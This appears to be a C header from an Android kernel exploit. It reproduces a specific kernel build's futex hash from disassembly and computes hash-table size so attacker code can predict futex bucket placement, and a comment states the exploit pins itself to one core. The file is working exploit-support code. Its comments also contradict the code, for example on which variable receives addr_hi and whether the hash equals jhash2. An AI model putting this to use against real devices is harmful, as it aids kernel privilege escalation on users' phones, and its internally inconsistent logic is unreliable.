#pragma once

#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <sys/time.h>

// --------------- ADDED/REPLACED FOR COMPATIBILITY ---------------
typedef uint32_t u32;
typedef uint32_t __u32;
typedef uint8_t u8;

// #include <linux/bitops.h>
static inline __u32 rol32(__u32 word, unsigned int shift)
{
    return (word << (shift & 31)) | (word >> ((-shift) & 31));
}

#define fallthrough __attribute__((fallthrough));
// --------------- ADDED/REPLACED FOR COMPATIBILITY ---------------

/* jhash.h: Jenkins hash support.
 *
 * Copyright (C) 2006. Bob Jenkins (bob_jenkins@burtleburtle.net)
 *
 * https://burtleburtle.net/bob/hash/
 *
 * These are the credits from Bob's sources:
 *
 * lookup3.c, by Bob Jenkins, May 2006, Public Domain.
 *
 * These are functions for producing 32-bit hashes for hash table lookup.
 * hashword(), hashlittle(), hashlittle2(), hashbig(), mix(), and final()
 * are externally useful functions.  Routines to test the hash are included
 * if SELF_TEST is defined.  You can use this free for any purpose.  It's in
 * the public domain.  It has no warranty.
 *
 * Copyright (C) 2009-2010 Jozsef Kadlecsik (kadlec@blackhole.kfki.hu)
 *
 * I've modified Bob's hash to be useful in the Linux kernel, and
 * any bugs present are my fault.
 * Jozsef
 */
// #include <linux/bitops.h>
// #include <linux/unaligned/packed_struct.h>

/* Best hash sizes are of power of two */
#define jhash_size(n)   ((u32)1<<(n))
/* Mask the hash value, i.e (value & jhash_mask(n)) instead of (value % n) */
#define jhash_mask(n)   (jhash_size(n)-1)

/* __jhash_mix -- mix 3 32-bit values reversibly. */
#define __jhash_mix(a, b, c)            \
{                        \
    a -= c;  a ^= rol32(c, 4);  c += b;    \
    b -= a;  b ^= rol32(a, 6);  a += c;    \
    c -= b;  c ^= rol32(b, 8);  b += a;    \
    a -= c;  a ^= rol32(c, 16); c += b;    \
    b -= a;  b ^= rol32(a, 19); a += c;    \
    c -= b;  c ^= rol32(b, 4);  b += a;    \
}

/* __jhash_final - final mixing of 3 32-bit values (a,b,c) into c */
#define __jhash_final(a, b, c)            \
{                        \
    c ^= b; c -= rol32(b, 14);        \
    a ^= c; a -= rol32(c, 11);        \
    b ^= a; b -= rol32(a, 25);        \
    c ^= b; c -= rol32(b, 16);        \
    a ^= c; a -= rol32(c, 4);        \
    b ^= a; b -= rol32(a, 14);        \
    c ^= b; c -= rol32(b, 24);        \
}

/* An arbitrary initial parameter — genevn 5.10.240 uses 0xdeadbeff
 * (from queue_lock / futex_wake inline hash disassembly). Do NOT
 * change this value; it is NOT the same as the standalone jhash2
 * function (which uses 0xdeadbf1b). */
#define JHASH_INITVAL_KERNEL_INLINE 0xdeadbeff

/* jhash2 - standard Jenkins hash, 32-bit words
 * Preserved for callers that need the general-purpose variant.
 * @k: the key as an array of u32's
 * @length: the number of u32's in the key
 * @initval: the previous hash, or an arbitrary value
 *
 * Returns the hash value of the key.
 */
static inline u32 jhash2(const u32 *k, u32 length, u32 initval)
{

    u32 a, b, c;

    /* Set up the internal state */
    a = b = c = JHASH_INITVAL_KERNEL_INLINE + (length<<2) + initval;

    /* Handle most of the key */
    while (length > 3) {
        a += k[0];
        b += k[1];
        c += k[2];
        __jhash_mix(a, b, c);
        length -= 3;
        k += 3;
    }

    /* Handle the last 3 u32's: all the case statements fall through */
    switch (length) {
    case 3: c += k[2];    fallthrough;
    case 2: b += k[1];    fallthrough;
    case 1: a += k[0];
        __jhash_final(a, b, c);
    case 0:    /* Nothing left to add */
        break;
    }

    return c;
}

/* __jhash_nwords - hash exactly 3, 2 or 1 word(s) */
static inline u32 __jhash_nwords(u32 a, u32 b, u32 c, u32 initval)
{
    a += initval;
    b += initval;
    c += initval;

    __jhash_final(a, b, c);

    return c;
}

static inline u32 jhash_3words(u32 a, u32 b, u32 c, u32 initval)
{
    return __jhash_nwords(a, b, c, initval + JHASH_INITVAL_KERNEL_INLINE + (3 << 2));
}

static inline u32 jhash_2words(u32 a, u32 b, u32 initval)
{
    return __jhash_nwords(a, b, 0, initval + JHASH_INITVAL_KERNEL_INLINE + (2 << 2));
}

static inline u32 jhash_1word(u32 a, u32 initval)
{
    return __jhash_nwords(a, 0, 0, initval + JHASH_INITVAL_KERNEL_INLINE + (1 << 2));
}

#define OFFSET_OF(TYPE, FIELD) ((size_t) &((TYPE *)0)->FIELD)
#ifndef KS_PAGE_MASK
#define KS_PAGE_MASK 0xfffULL
#endif

#define FUTEX_KEY_INIT (union futex_key) { .both = { .ptr = 0ULL } }

typedef union {
    struct {
        uint64_t i_seq;
        unsigned long pgoff;
        unsigned int offset;
    } shared;
    struct {
        union {
            // struct mm_struct *mm;
            void *mm;
            uint64_t __tmp;
        };
        unsigned long address;
        unsigned int offset;
    } private;
    struct {
        uint64_t ptr;
        unsigned long word;
        unsigned int offset;
    } both;
} futex_key_t;

/* ------------------------------------------------------------------
 * genevn 5.10.240 kernel's futex_key hash function
 *
 * Disassembly of futex_wake (0xffffffc008292c3c) and queue_lock
 * (0xffffffc008299fa8) both contain the same inlined hash.  The
 * algorithm is a 3-word Jenkins mix of (mm_lo, mm_hi, addr_lo) with
 * init = (offset + 0xdeadbeff), then adds addr_hi after the mix,
 * then runs the standard __jhash_final.
 *
 * This IS jhash2((u32*)key, 4, offset): hashing all 4 key words
 * {mm_lo, mm_hi, addr_lo, addr_hi} with initval = offset.
 * 0xdeadbeff = 0xdeadbeef + (4<<2) = JHASH_INITVAL + length term.
 * After the 3-word mix, the 4th word (addr_hi) is added to `a`
 * (jhash2 case-1 switch path), then __jhash_final runs.
 * ------------------------------------------------------------------ */
static inline u32 kernel_inline_futex_hash(u32 mm_lo, u32 mm_hi,
                                           u32 addr_lo, u32 addr_hi,
                                           u32 offset)
{
    u32 init = offset + JHASH_INITVAL_KERNEL_INLINE;

    u32 a = mm_lo + init;
    u32 b = mm_hi + init;
    u32 c = addr_lo + init;

    __jhash_mix(a, b, c);

    a += addr_hi;

    __jhash_final(a, b, c);

    return c;
}

uint32_t futex_hash_no_trunc(futex_key_t *key)
{
    u32 *kw = (u32 *)key;
    /* genevn 5.10.240: the kernel's compiled futex hash is an INLINE variant,
     * not a call to the standalone jhash2.  Three differences from jhash2():
     *   1. initval = 0xdeadbeff (not 0xdeadbf1b)
     *   2. init = offset + initval, NO (length<<2) term
     *   3. 3-word mix {mm_lo, mm_hi, addr_lo}, then c += addr_hi AFTER mix
     * Verified by disassembly of futex_wake (0xffffffc008292c3c) and
     * queue_lock (0xffffffc008299fa8) — both use the same inline hash.
     * kw[0]=mm_lo, kw[1]=mm_hi, kw[2]=addr_lo, kw[3]=addr_hi, kw[4]=offset */
    return kernel_inline_futex_hash(kw[0], kw[1], kw[2], kw[3], kw[4]);
}

uint32_t __futex_hash(futex_key_t *key, uint32_t futex_hashsize)
{
    uint32_t hash = futex_hash_no_trunc(key);

    return hash & (futex_hashsize-1);
}

unsigned long futex_hashsize = (unsigned long)-1;

/* ---------- on-device CPU-count fix (genevn, 2026-10-28) ----------
 * The static musl build computes sysconf(_SC_NPROCESSORS_ONLN/CONF) from the
 * process affinity mask, and the exploit pins itself to one core first, so
 * both calls return 1 while the phone has 8 possible CPUs. The kernel futex
 * hash table is roundup_pow_of_two(256 * num_possible_cpus())
 * (kernel/futex/core.c). Track-B (ghostlock-app) fixes this by using
 * _SC_NPROCESSORS_CONF on bionic; we derive the possible count from sysfs so
 * the result does not depend on libc affinity semantics. */
static inline size_t ks_possible_cpus(void)
{
    FILE *f = fopen("/sys/devices/system/cpu/present", "r");
    if (!f) return 4;
    char buf[128];
    if (!fgets(buf, sizeof(buf), f)) { fclose(f); return 4; }
    fclose(f);
    /* format "0-3,6-7": sum each range */
    size_t total = 0;
    char *tok = buf;
    while (tok && *tok) {
        char *comma = strchr(tok, ',');
        if (comma) *comma = '\0';
        char *dash = strchr(tok, '-');
        if (dash) {
            int lo = atoi(tok);
            int hi = atoi(dash + 1);
            total += (size_t)(hi >= lo ? (hi - lo + 1) : 1);
        } else {
            total += 1;
        }
        if (!comma) break;
        tok = comma + 1;
    }
    return total > 0 ? total : 1;
}

/* kernel/futex/base.c: the hash table size is the power-of-two of
 * (256 * num_possible_cpus()); never the online subset. */
static inline size_t ks_futex_hash_table(size_t possible_cpus)
{
    size_t size = (possible_cpus ? possible_cpus : 1) * 256;
    size_t rounded = 1;
    while (rounded < size) rounded <<= 1;
    return rounded;
}

void futex_init(void)
{
    futex_hashsize = ks_futex_hash_table(ks_possible_cpus());
}
uint32_t futex_hash(size_t addr, size_t mm)
{
    ASSERT_pr((futex_hashsize != (unsigned long)-1), "need to call futex_init() first\n");
    futex_key_t key;
    key.private.mm = (void *)mm;
    key.private.address = addr & ~KS_PAGE_MASK;
    key.private.offset = addr & KS_PAGE_MASK;
    return __futex_hash(&key, futex_hashsize);
}
